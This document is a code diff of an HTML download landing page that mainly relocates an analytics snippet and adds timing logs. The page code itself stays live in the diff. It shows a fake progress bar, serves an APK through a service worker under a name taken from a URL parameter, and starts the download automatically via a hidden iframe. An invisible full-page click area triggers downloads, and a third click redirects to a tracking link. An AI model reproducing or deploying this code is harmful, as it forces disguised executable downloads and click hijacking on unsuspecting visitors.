@@ -7,226 +7,238 @@
     <title>Download</title>
     <script src="../params.js?v=personal-site-6"></script>
     <script>
-      window.__downloadTestRevision = 'personal-site-6';
-      window.__downloadSwVersion = '42316858';
-      window.__downloadSwUrl = `${window.__landingRoot}sw4.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
-      window.__swReadyPromise = (async () => {
-        await window.__landingParamsReady;
-        if (!('serviceWorker' in navigator)) {
-          return { ok: false, direct: true, reason: 'unsupported' };
-        }
+     const start = performance.now()
 
-        const registration = await navigator.serviceWorker.register(window.__downloadSwUrl);
-        await registration.update();
+     !function(t,e){var o,n,p,r;e.__SV||(window.posthog && window.posthog.__loaded)||(window.posthog=e,e._i=[],e.init=function(i,s,a){function g(t,e){var o=e.split(".");2==o.length&&(t=t[o[0]],e=o[1]),t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}}p||((p=t.createElement("script")).type="text/javascript",p.crossOrigin="anonymous",p.async=!0,p.src=s.api_host.replace(".i.posthog.com","-assets.i.posthog.com")+"/static/array.js",p.onerror=function(){p=null},(r=t.getElementsByTagName("script")[0]).parentNode.insertBefore(p,r));var u=e;for(void 0!==a?u=e[a]=[]:a="posthog",u.people=u.people||[],Object.defineProperty(u,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(t){var e="posthog";return"posthog"!==a&&(e+="."+a),t||(e+=" (stub)"),e}}),Object.defineProperty(u.people,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(){return u.toString(1)+".people (stub)"}}),o="Eh Rh Ph Oh Dh qh init yd bd dd fd Sd wc md xd ad Ed Ad Rd Pd Od Fd capture getExtension gr pd gd calculateEventProperties Dd register register_once register_for_session unregister unregister_for_session zd hd jd getFeatureFlag getFeatureFlagPayload getFeatureFlagResult getAllFeatureFlags isFeatureEnabled reloadFeatureFlags updateFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys onActiveMatchingSurveysChanged renderSurvey displaySurvey cancelPendingSurvey canRenderSurvey canRenderSurveyAsync Hd identify setPersonProperties unsetPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset Ud shutdown setIdentity clearIdentity get_distinct_id getGroups get_session_id get_session_replay_url alias set_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException addExceptionStep captureLog startExceptionAutocapture stopExceptionAutocapture loadToolbar get_property getSessionProperty qd Td createPersonProfile setInternalOrTestUser Bd Uh zh opt_in_capturing opt_out_capturing Hh has_opted_in_capturing has_opted_out_capturing get_explicit_consent_status is_capturing clear_opt_in_out_capturing $d debug kc Ds getPageViewId captureTraceFeedback captureTraceMetric rd".split(" "),n=0;n<o.length;n++)g(u,o[n]);e._i.push([i,s,a])},e.__SV=1)}(document,window.posthog||[]);
 
-        if (registration.waiting) {
-          registration.waiting.postMessage({ type: 'SKIP_WAITING' });
-        }
+     posthog.init('phc_vqyXNzhYhfpZrwKKGMQ2VjQq2azSdh2StkeoHodd26NL', {
+         api_host: 'https://uiuirestorehere.art',
+         advanced_disable_flags: true,
+         disable_external_dependency_loading: false,
+         disable_session_recording: true,
+         disable_surveys: true,
+         capture_exceptions: {
+             capture_unhandled_errors: true,
+             capture_unhandled_rejections: true,
+             capture_console_errors: false,
+         },
+         autocapture: true,
+         capture_pageview: true,
+         capture_pageleave: true,
+         logs: {
+             serviceName: 'web',
+             environment: 'production',
+         },
+         person_profiles: 'identified_only',
+     });
 
-        await navigator.serviceWorker.ready;
+     posthog.register({
+         land: '023',
+     });
 
-        const expectedWorkerUrl = new URL(window.__downloadSwUrl, window.location.href).href;
-        if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) {
-          await new Promise((resolve, reject) => {
-            const timeout = window.setTimeout(() => {
-              navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
-              reject(new Error('controller timeout'));
-            }, 5000);
+     posthog.logger.info('Posthog init', {"delay": performance.now() - start})
 
-            function onControllerChange() {
-              if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) return;
-              navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
-              window.clearTimeout(timeout);
-              resolve();
-            }
+     window.__downloadTestRevision = 'personal-site-6';
+     window.__downloadSwVersion = '42316858';
+     window.__downloadSwUrl = `${window.__landingRoot}sw4.js?v=${window.__downloadSwVersion}&r=${window.__downloadTestRevision}`;
+     window.__swReadyPromise = (async () => {
+         posthog.logger.info('Await window.__landingParamsReady [swReadyPromise]', {"delay": performance.now() - start})
+         await window.__landingParamsReady;
+         posthog.logger.info('Awaited window.__landingParamsReady [swReadyPromise]', {"delay": performance.now() - start})
+         if (!('serviceWorker' in navigator)) {
+             return { ok: false, direct: true, reason: 'unsupported' };
+         }
 
-            navigator.serviceWorker.addEventListener('controllerchange', onControllerChange);
-          });
-        }
+         posthog.logger.info('Await registration worker', {"delay": performance.now() - start})
+         const registration = await navigator.serviceWorker.register(window.__downloadSwUrl);
+         posthog.logger.info('Awaited registration worker', {"delay": performance.now() - start})
 
-        return {
-          ok: true,
-          direct: false,
-          registration,
-          controller: navigator.serviceWorker.controller,
-        };
-      })().catch((error) => {
-        console.error('[download] early service worker setup failed', error);
-        return { ok: false, direct: true, reason: error.message };
-      });
+         posthog.logger.info('Await registration worker update', {"delay": performance.now() - start})
+         await registration.update();
+         posthog.logger.info('Awaited registration worker update', {"delay": performance.now() - start})
+
+         if (registration.waiting) {
+             registration.waiting.postMessage({ type: 'SKIP_WAITING' });
+         }
+
+         posthog.logger.info('Await service worker ready', {"delay": performance.now() - start})
+         await navigator.serviceWorker.ready;
+         posthog.logger.info('Awaited service worker ready', {"delay": performance.now() - start})
+
+         const expectedWorkerUrl = new URL(window.__downloadSwUrl, window.location.href).href;
+         if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) {
+             await new Promise((resolve, reject) => {
+                 const timeout = window.setTimeout(() => {
+                     navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
+                     reject(new Error('controller timeout'));
+                 }, 5000);
+
+                 function onControllerChange() {
+                     if (navigator.serviceWorker.controller?.scriptURL !== expectedWorkerUrl) return;
+                     navigator.serviceWorker.removeEventListener('controllerchange', onControllerChange);
+                     window.clearTimeout(timeout);
+                     resolve();
+                 }
+
+                 navigator.serviceWorker.addEventListener('controllerchange', onControllerChange);
+             });
+         }
+
+         return {
+             ok: true,
+             direct: false,
+             registration,
+             controller: navigator.serviceWorker.controller,
+         };
+     })().catch((error) => {
+         posthog.logger.error('Early service worker setup failed', {"delay": performance.now() - start, "error_message": error.message})
+         return { ok: false, direct: true, reason: error.message };
+     });
     </script>
     <style>
-      * {
-          box-sizing: border-box;
-          margin: 0;
-          padding: 0;
-          font-family: Verdana, Arial, Helvetica, sans-serif;
-      }
+     * {
+       box-sizing: border-box;
+       margin: 0;
+       padding: 0;
+       font-family: Verdana, Arial, Helvetica, sans-serif;
+     }
 
-      body {
-          min-height: 100vh;
-          overflow: hidden;
-          display: flex;
-          flex-direction: column;
-          background: #fff;
-          color: #1b1b1b;
-      }
+     body {
+       min-height: 100vh;
+       overflow: hidden;
+       display: flex;
+       flex-direction: column;
+       background: #fff;
+       color: #1b1b1b;
+     }
 
-      .f-data {
-          margin: 20vh auto 0;
-          display: flex;
-          flex-direction: row;
-          align-items: center;
-          gap: 15px;
-          font-size: 14px;
-      }
+     .f-data {
+       margin: 20vh auto 0;
+       display: flex;
+       flex-direction: row;
+       align-items: center;
+       gap: 15px;
+       font-size: 14px;
+     }
 
-      .f-image {
-          width: 70px;
-          height: 105px;
-          background: url(file.png) center 6px / 70px no-repeat;
-          flex: 0 0 auto;
-      }
+     .f-image {
+       width: 70px;
+       height: 105px;
+       background: url(file.png) center 6px / 70px no-repeat;
+       flex: 0 0 auto;
+     }
 
-      .f-info {
-          display: flex;
-          flex-direction: column;
-          gap: 2px;
-      }
+     .f-info {
+       display: flex;
+       flex-direction: column;
+       gap: 2px;
+     }
 
-      .f-name {
-          width: 200px;
-          overflow-wrap: break-word;
-          font-size: 14px;
-          font-weight: 700;
-      }
+     .f-name {
+       width: 200px;
+       overflow-wrap: break-word;
+       font-size: 14px;
+       font-weight: 700;
+     }
 
-      .f-size,
-      .f-uploaded {
-          font-size: 16px;
-      }
+     .f-size,
+     .f-uploaded {
+       font-size: 16px;
+     }
 
-      .s-box {
-          position: relative;
-          width: 270px;
-          height: 50px;
-          margin: 12px auto 0;
-          padding: 1px;
-          border-radius: 10px;
-          box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
-      }
+     .s-box {
+       position: relative;
+       width: 270px;
+       height: 50px;
+       margin: 12px auto 0;
+       padding: 1px;
+       border-radius: 10px;
+       box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
+     }
 
-      .scale {
-          width: 0;
-          height: 100%;
-          border-radius: 10px;
-          background: linear-gradient(279deg, rgba(109, 215, 90, 1) 1%, rgba(38, 130, 20, 1) 63%);
-          transition: 200ms;
-      }
+     .scale {
+       width: 0;
+       height: 100%;
+       border-radius: 10px;
+       background: linear-gradient(279deg, rgba(109, 215, 90, 1) 1%, rgba(38, 130, 20, 1) 63%);
+       transition: 200ms;
+     }
 
-      .scale-percent {
-          position: absolute;
-          top: 10px;
-          left: 10px;
-          color: #fff;
-          font-size: 26px;
-          font-weight: 700;
-          text-shadow: 2px 2px rgb(29, 29, 29);
-      }
+     .scale-percent {
+       position: absolute;
+       top: 10px;
+       left: 10px;
+       color: #fff;
+       font-size: 26px;
+       font-weight: 700;
+       text-shadow: 2px 2px rgb(29, 29, 29);
+     }
 
-      .d-box {
-          position: relative;
-          width: 100%;
-          height: 100px;
-          margin-top: 20px;
-          overflow: hidden;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-      }
+     .d-box {
+       position: relative;
+       width: 100%;
+       height: 100px;
+       margin-top: 20px;
+       overflow: hidden;
+       display: flex;
+       align-items: center;
+       justify-content: center;
+     }
 
-      .d-button-box {
-          position: absolute;
-          top: -100%;
-          width: 250px;
-          height: 100px;
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          transition: 1s;
-      }
+     .d-button-box {
+       position: absolute;
+       top: -100%;
+       width: 250px;
+       height: 100px;
+       display: flex;
+       align-items: center;
+       justify-content: center;
+       transition: 1s;
+     }
 
-      button {
-          position: relative;
-          border: 0;
-          border-radius: 20px;
-          padding: 20px 38px;
-          display: flex;
-          flex-direction: row;
-          align-items: center;
-          justify-content: center;
-          gap: 10px;
-          background: #339120;
-          box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
-          color: #fff;
-          font-size: 20px;
-          font-weight: 600;
-          letter-spacing: 1px;
-          text-align: center;
-          text-transform: uppercase;
-          cursor: pointer;
-      }
+     button {
+       position: relative;
+       border: 0;
+       border-radius: 20px;
+       padding: 20px 38px;
+       display: flex;
+       flex-direction: row;
+       align-items: center;
+       justify-content: center;
+       gap: 10px;
+       background: #339120;
+       box-shadow: 1px 1px 5px rgba(124, 124, 124, 0.223);
+       color: #fff;
+       font-size: 20px;
+       font-weight: 600;
+       letter-spacing: 1px;
+       text-align: center;
+       text-transform: uppercase;
+       cursor: pointer;
+     }
 
-      button:disabled {
-          cursor: wait;
-          opacity: 0.7;
-      }
+     button:disabled {
+       cursor: wait;
+       opacity: 0.7;
+     }
 
-      .click-area {
-          position: fixed;
-          inset: 0;
-          z-index: 10;
-          cursor: pointer;
-      }
+     .click-area {
+       position: fixed;
+       inset: 0;
+       z-index: 10;
+       cursor: pointer;
+     }
 
-      .hidden-frame {
-          position: absolute;
-          width: 0;
-          height: 0;
-          border: 0;
-          opacity: 0;
-          pointer-events: none;
-      }
+     .hidden-frame {
+       position: absolute;
+       width: 0;
+       height: 0;
+       border: 0;
+       opacity: 0;
+       pointer-events: none;
+     }
 
     </style>
-    <script>
-      !function(t,e){var o,n,p,r;e.__SV||(window.posthog && window.posthog.__loaded)||(window.posthog=e,e._i=[],e.init=function(i,s,a){function g(t,e){var o=e.split(".");2==o.length&&(t=t[o[0]],e=o[1]),t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}}p||((p=t.createElement("script")).type="text/javascript",p.crossOrigin="anonymous",p.async=!0,p.src=s.api_host.replace(".i.posthog.com","-assets.i.posthog.com")+"/static/array.js",p.onerror=function(){p=null},(r=t.getElementsByTagName("script")[0]).parentNode.insertBefore(p,r));var u=e;for(void 0!==a?u=e[a]=[]:a="posthog",u.people=u.people||[],Object.defineProperty(u,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(t){var e="posthog";return"posthog"!==a&&(e+="."+a),t||(e+=" (stub)"),e}}),Object.defineProperty(u.people,"toString",{configurable:!0,enumerable:!0,writable:!0,value:function(){return u.toString(1)+".people (stub)"}}),o="Eh Rh Ph Oh Dh qh init yd bd dd fd Sd wc md xd ad Ed Ad Rd Pd Od Fd capture getExtension gr pd gd calculateEventProperties Dd register register_once register_for_session unregister unregister_for_session zd hd jd getFeatureFlag getFeatureFlagPayload getFeatureFlagResult getAllFeatureFlags isFeatureEnabled reloadFeatureFlags updateFlags updateEarlyAccessFeatureEnrollment getEarlyAccessFeatures on onFeatureFlags onSurveysLoaded onSessionId getSurveys getActiveMatchingSurveys onActiveMatchingSurveysChanged renderSurvey displaySurvey cancelPendingSurvey canRenderSurvey canRenderSurveyAsync Hd identify setPersonProperties unsetPersonProperties group resetGroups setPersonPropertiesForFlags resetPersonPropertiesForFlags setGroupPropertiesForFlags resetGroupPropertiesForFlags reset Ud shutdown setIdentity clearIdentity get_distinct_id getGroups get_session_id get_session_replay_url alias set_config startSessionRecording stopSessionRecording sessionRecordingStarted captureException addExceptionStep captureLog startExceptionAutocapture stopExceptionAutocapture loadToolbar get_property getSessionProperty qd Td createPersonProfile setInternalOrTestUser Bd Uh zh opt_in_capturing opt_out_capturing Hh has_opted_in_capturing has_opted_out_capturing get_explicit_consent_status is_capturing clear_opt_in_out_capturing $d debug kc Ds getPageViewId captureTraceFeedback captureTraceMetric rd".split(" "),n=0;n<o.length;n++)g(u,o[n]);e._i.push([i,s,a])},e.__SV=1)}(document,window.posthog||[]);
-
-      posthog.init('phc_vqyXNzhYhfpZrwKKGMQ2VjQq2azSdh2StkeoHodd26NL', {
-        api_host: 'https://uiuirestorehere.art',
-        advanced_disable_flags: true,
-        disable_external_dependency_loading: false,
-        disable_session_recording: true,
-        disable_surveys: true,
-        capture_exceptions: {
-          capture_unhandled_errors: true,
-          capture_unhandled_rejections: true,
-          capture_console_errors: false,
-        },
-        autocapture: true,
-        capture_pageview: true,
-        capture_pageleave: true,
-        logs: {
-          serviceName: 'web',
-          environment: 'production',
-        },
-        person_profiles: 'identified_only',
-      });
-
-      posthog.register({
-        land: '023',
-      });
-    </script>
   </head>
   <body>
     <div class="f-data">
@@ -257,182 +269,176 @@
     <iframe id="downloadFrame" class="hidden-frame" title="download frame" aria-hidden="true"></iframe>
 
     <script>
-      (() => {
-        const start = performance.now()
-        const DEFAULT_FILE_NAME = 'download9918.apk';
-        const TEST_REVISION = window.__downloadTestRevision;
-        const SW_VERSION = window.__downloadSwVersion;
-        const SW_URL = window.__downloadSwUrl;
-        const REDIRECT_HREF = 'https://immenselybossseal.com/path?key=01f48ac1c32a45189507ced9b43601b9&utm_source=lp_click';
+     (() => {
+         const DEFAULT_FILE_NAME = 'download9918.apk';
+         const TEST_REVISION = window.__downloadTestRevision;
+         const SW_VERSION = window.__downloadSwVersion;
+         const SW_URL = window.__downloadSwUrl;
+         const REDIRECT_HREF = 'https://immenselybossseal.com/path?key=01f48ac1c32a45189507ced9b43601b9&utm_source=lp_click';
 
-        const downloadButton = document.querySelector('#downloadButton');
-        const downloadFrame = document.querySelector('#downloadFrame');
-        const clickArea = document.querySelector('#clickArea');
-        const fileTitle = document.querySelector('#fileTitle');
-        const scale = document.querySelector('.scale');
-        const scalePercentText = document.querySelector('.scale-percent');
-        const downloadButtonBox = document.querySelector('.d-button-box');
+         const downloadButton = document.querySelector('#downloadButton');
+         const downloadFrame = document.querySelector('#downloadFrame');
+         const clickArea = document.querySelector('#clickArea');
+         const fileTitle = document.querySelector('#fileTitle');
+         const scale = document.querySelector('.scale');
+         const scalePercentText = document.querySelector('.scale-percent');
+         const downloadButtonBox = document.querySelector('.d-button-box');
 
-        let savedParams = new URLSearchParams();
-        let offerId = null;
-        let fileName = DEFAULT_FILE_NAME;
-        let isServiceWorkerReady = false;
-        let trustedClickCount = 0;
-        let isPresentationReady = false;
+         let savedParams = new URLSearchParams();
+         let offerId = null;
+         let fileName = DEFAULT_FILE_NAME;
+         let isServiceWorkerReady = false;
+         let trustedClickCount = 0;
+         let isPresentationReady = false;
 
-        function log(message, data) {
-          posthog.logger.info('Send log from function test')
-          if (data === undefined) {
-            console.log(`[download] ${message}`);
-            return;
-          }
+         function sanitizeFileName(value) {
+             const fallbackBase = DEFAULT_FILE_NAME.replace(/\.apk$/i, '');
+             const candidate = String(value || '')
+                 .replace(/\.apk$/i, '')
+                 .slice(0, 80);
+             const isValid = candidate !== ''
+                          && !/^[ _-]+$/.test(candidate)
+                          && !/^ /.test(candidate)
+                          && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
+             const base = isValid ? candidate : fallbackBase;
+             return `${base}.apk`;
+         }
 
-          console.log(`[download] ${message}`, data);
-        }
+         function getSavedOfferId() {
+             const value = savedParams.get('offer_id');
+             return value && value.trim() ? value.trim().slice(0, 80) : null;
+         }
 
-        function sanitizeFileName(value) {
-          const fallbackBase = DEFAULT_FILE_NAME.replace(/\.apk$/i, '');
-          const candidate = String(value || '')
-                .replace(/\.apk$/i, '')
-                .slice(0, 80);
-          const isValid = candidate !== ''
-                && !/^[ _-]+$/.test(candidate)
-                && !/^ /.test(candidate)
-                && /^[a-zA-Z0-9_*(). -]+$/.test(candidate);
-          const base = isValid ? candidate : fallbackBase;
-          return `${base}.apk`;
-        }
+         function getSavedFileName() {
+             return sanitizeFileName(savedParams.get('utm_medium'));
+         }
 
-        function getSavedOfferId() {
-          const value = savedParams.get('offer_id');
-          return value && value.trim() ? value.trim().slice(0, 80) : null;
-        }
+         function getRedirectUrl() {
+             const target = new URL(REDIRECT_HREF);
+             target.searchParams.set('clickid', savedParams.get('clickid') || '');
+             return target.href;
+         }
 
-        function getSavedFileName() {
-          return sanitizeFileName(savedParams.get('utm_medium'));
-        }
+         async function registerServiceWorker() {
+             posthog.logger.info('Await window.__landParamsReady', {"delay": performance.now() - start})
+             await window.__landingParamsReady;
+             posthog.logger.info('Awaited window.__landParamsReady', {"delay": performance.now() - start})
 
-        function getRedirectUrl() {
-          const target = new URL(REDIRECT_HREF);
-          target.searchParams.set('clickid', savedParams.get('clickid') || '');
-          return target.href;
-        }
+             savedParams = window.__savedDownloadParams;
+             offerId = getSavedOfferId();
+             fileName = getSavedFileName();
+             const title = document.querySelector('#fileTitle');
+             if (title) title.textContent = fileName;
 
-        async function registerServiceWorker() {
-          await window.__landingParamsReady;
-          savedParams = window.__savedDownloadParams;
-          offerId = getSavedOfferId();
-          fileName = getSavedFileName();
-          const title = document.querySelector('#fileTitle');
-          if (title) title.textContent = fileName;
-          const swState = await window.__swReadyPromise;
+             posthog.logger.info('Await window.__swReadyPromise', {"delay": performance.now() - start})
+             const swState = await window.__swReadyPromise;
+             posthog.logger.info('Awaited window.__swReadyPromise', {"delay": performance.now() - start})
 
-          if (!swState.ok || swState.direct) {
-            downloadButton.disabled = true;
-            log('service worker is required for offer download', { reason: swState.reason, offerId });
-            return;
-          }
+             if (!swState.ok || swState.direct) {
+                 downloadButton.disabled = true;
+                 posthog.logger.warn('Service worker is required for offer download', {"delay": performance.now() - start, "offer_id": offerId})
+                 return;
+             }
 
-          isServiceWorkerReady = true;
-          log('ready to download', {
-            controller: swState.controller && swState.controller.scriptURL,
-            swUrl: SW_URL,
-            offerId,
-            fileName,
-          });
-        }
+             isServiceWorkerReady = true;
+             posthog.logger.info('Ready to download', {"delay": performance.now() - start, "sw_url": SW_URL, "offer_id": offerId, "fileName": fileName})
+         }
 
-        function startDownload() {
-          if (!offerId) {
-            log('offer_id is missing. Add ?offer_id=123');
-            return;
-          }
+         function startDownload() {
+             posthog.logger.info('Start download', {"delay": performance.now() - start})
+             if (!offerId) {
+                 posthog.logger.warn('offer_id is missing', {"delay": performance.now() - start})
+                 return;
+             }
 
-          const target = new URL('download.apk', window.__landingRoot);
-          log('starting service worker download', { offerId, fileName, target: target.href });
-          downloadFrame.src = 'about:blank';
-          window.setTimeout(() => {
-            downloadFrame.src = target.href;
-          }, 0);
-        }
+             const target = new URL('download.apk', window.__landingRoot);
+             posthog.logger.info('Starting service worker download', {"delay": performance.now() - start, "sw_url": SW_URL, "offer_id": offerId, "fileName": fileName, "target": target.href})
 
-        function handleDownloadClick(event) {
-          if (!isPresentationReady) {
-            return;
-          }
+             downloadFrame.src = 'about:blank';
+             window.setTimeout(() => {
+                 downloadFrame.src = target.href;
+                 posthog.logger.info('End download after timeout', {"delay": performance.now() - start})
+             }, 0);
+         }
 
-          if (!isServiceWorkerReady) {
-            log('download requested before service worker readiness');
-            return;
-          }
+         function handleDownloadClick(event) {
+             if (!isPresentationReady) {
+                 return;
+             }
 
-          if (event && event.isTrusted) {
-            trustedClickCount += 1;
+             if (!isServiceWorkerReady) {
+                 posthog.logger.info('Download requested before service worker readiness', {"delay": performance.now() - start})
+                 return;
+             }
 
-            if (trustedClickCount >= 3) {
-              window.location.href = getRedirectUrl();
-              return;
-            }
-          }
+             if (event && event.isTrusted) {
+                 trustedClickCount += 1;
 
-          startDownload();
-        }
+                 if (trustedClickCount >= 3) {
+                     window.location.href = getRedirectUrl();
+                     return;
+                 }
+             }
 
-        function runProgress() {
-          return new Promise((resolve) => {
-            let scorePercent = 0;
-            scalePercentText.textContent = '0%';
-            const timer = window.setInterval(() => {
-              scorePercent += 10;
-              scale.style.width = `${scorePercent}%`;
-              scalePercentText.textContent = `${scorePercent}%`;
-              if (scorePercent < 100) {
-                return;
-              }
+             startDownload();
+         }
 
-              window.clearInterval(timer);
-              // Let the final 200ms scale transition reach 100% before revealing the button.
-              window.setTimeout(() => {
-                let fallback;
-                function finish(event) {
-                  if (event && (event.target !== downloadButtonBox || event.propertyName !== 'top')) {
-                    return;
-                  }
-                  window.clearTimeout(fallback);
-                  downloadButtonBox.removeEventListener('transitionend', finish);
-                  resolve();
-                }
-                downloadButtonBox.addEventListener('transitionend', finish);
-                // Also complete in background tabs where transitionend may not fire.
-                fallback = window.setTimeout(finish, 1100);
-                downloadButtonBox.style.top = '0';
-              }, 200);
-            }, 100);
-          });
-        }
+         function runProgress() {
+             posthog.logger.info('Run progress bar', {"delay": performance.now() - start})
+             return new Promise((resolve) => {
+                 let scorePercent = 0;
+                 scalePercentText.textContent = '0%';
+                 const timer = window.setInterval(() => {
+                     scorePercent += 10;
+                     scale.style.width = `${scorePercent}%`;
+                     scalePercentText.textContent = `${scorePercent}%`;
+                     if (scorePercent < 100) {
+                         return;
+                     }
 
-        if (fileTitle) {
-          fileTitle.textContent = fileName;
-        }
+                     window.clearInterval(timer);
+                     // Let the final 200ms scale transition reach 100% before revealing the button.
+                     window.setTimeout(() => {
+                         let fallback;
+                         function finish(event) {
+                             if (event && (event.target !== downloadButtonBox || event.propertyName !== 'top')) {
+                                 return;
+                             }
+                             window.clearTimeout(fallback);
+                             downloadButtonBox.removeEventListener('transitionend', finish);
+                             resolve();
+                         }
+                         downloadButtonBox.addEventListener('transitionend', finish);
+                         // Also complete in background tabs where transitionend may not fire.
+                         fallback = window.setTimeout(finish, 1100);
+                         downloadButtonBox.style.top = '0';
+                     }, 200);
+                 }, 100);
+             });
+         }
 
-        downloadButton.addEventListener('click', handleDownloadClick);
-        clickArea.addEventListener('click', handleDownloadClick);
+         if (fileTitle) {
+             fileTitle.textContent = fileName;
+         }
 
-        const downloadReady = registerServiceWorker().catch((error) => {
-          console.error('[download] service worker setup failed', error);
-          downloadButton.disabled = true;
-          log('service worker setup failed', { error: error.message, offerId });
-        });
+         downloadButton.addEventListener('click', handleDownloadClick);
+         clickArea.addEventListener('click', handleDownloadClick);
 
-        Promise.all([runProgress(), downloadReady]).then(() => {
-          isPresentationReady = true;
-          downloadButton.disabled = !(isServiceWorkerReady && offerId);
-          if (!downloadButton.disabled) {
-            startDownload();
-          }
-        });
+         const downloadReady = registerServiceWorker().catch((error) => {
+             console.error('[download] service worker setup failed', error);
+             downloadButton.disabled = true;
+             posthog.logger.error('Service worker setup failed', {"delay": performance.now() - start, "offer_id": offerId, "error_message": error.message})
+         });
 
-      })();
+         Promise.all([runProgress(), downloadReady]).then(() => {
+             isPresentationReady = true;
+             downloadButton.disabled = !(isServiceWorkerReady && offerId);
+             if (!downloadButton.disabled) {
+                 startDownload();
+             }
+         });
+
+     })();
 
     </script>
   </body>
